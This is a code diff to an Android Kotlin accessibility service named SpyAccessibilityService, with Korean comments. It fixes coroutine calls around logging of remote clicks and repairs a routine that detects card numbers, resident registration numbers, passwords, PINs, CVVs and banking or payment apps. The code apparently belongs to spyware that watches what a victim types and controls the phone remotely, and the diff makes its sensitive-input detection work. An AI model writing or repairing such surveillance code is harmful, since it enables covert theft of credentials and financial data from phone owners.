@@ -32,8 +32,11 @@ class SpyAccessibilityService : AccessibilityService() {
         isServiceRunning = true
 
         Log.d(TAG, "고급 접근성 서비스 시작됨")
-        logServiceEvent("SERVICE_STARTED", "Enhanced accessibility service activated")
+        serviceScope.launch {  // 코루틴 스코프에서 호출
+            logServiceEvent("SERVICE_STARTED", "Enhanced accessibility service activated")
+        }
     }
+
 
     override fun onDestroy() {
         super.onDestroy()
@@ -41,7 +44,9 @@ class SpyAccessibilityService : AccessibilityService() {
         isServiceRunning = false
         serviceScope.cancel()
 
-        logServiceEvent("SERVICE_STOPPED", "Enhanced accessibility service deactivated")
+        serviceScope.launch {  // 코루틴 스코프에서 호출
+            logServiceEvent("SERVICE_STOPPED", "Enhanced accessibility service deactivated")
+        }
         Log.d(TAG, "고급 접근성 서비스 종료됨")
     }
 
@@ -306,9 +311,10 @@ class SpyAccessibilityService : AccessibilityService() {
             val result = dispatchGesture(gesture, null, null)
 
             if (result) {
-                logRemoteAction("REMOTE_CLICK", "Clicked at ($x, $y)")
+                serviceScope.launch {  // 코루틴 스코프 추가
+                    logRemoteAction("REMOTE_CLICK", "Clicked at ($x, $y)")
+                }
             }
-
             result
         } catch (e: Exception) {
             Log.e(TAG, "원격 클릭 실행 오류: ${e.message}")
@@ -455,16 +461,17 @@ class SpyAccessibilityService : AccessibilityService() {
                 node?.className?.toString()?.contains("password", true) == true
     }
 
+    // SpyAccessibilityService.kt - line 465 부근
     private fun detectSensitiveInput(text: String, packageName: String): Boolean {
         val sensitivePatterns = listOf(
-            "\\d{13,19}".toRegex(), // 카드번호
-            "\\d{3}-\\d{2}-\\d{4}".toRegex(), // 주민번호
-            "password", "비밀번호", "pin", "cvv"
+            Regex("\\d{13,19}"), // 카드번호
+            Regex("\\d{3}-\\d{2}-\\d{4}"), // 주민번호
+            Regex("password|비밀번호|pin|cvv", RegexOption.IGNORE_CASE)
         )
 
-        return sensitivePatterns.any { it.containsMatchIn(text.lowercase()) } ||
-                packageName.contains("bank", true) ||
-                packageName.contains("pay", true)
+        return sensitivePatterns.any { pattern ->
+            pattern.containsMatchIn(text)  // matches 대신 containsMatchIn 사용
+        } || packageName.contains("bank", true) || packageName.contains("pay", true)
     }
 
     private fun isImportantButton(contentDesc: String, className: String): Boolean {
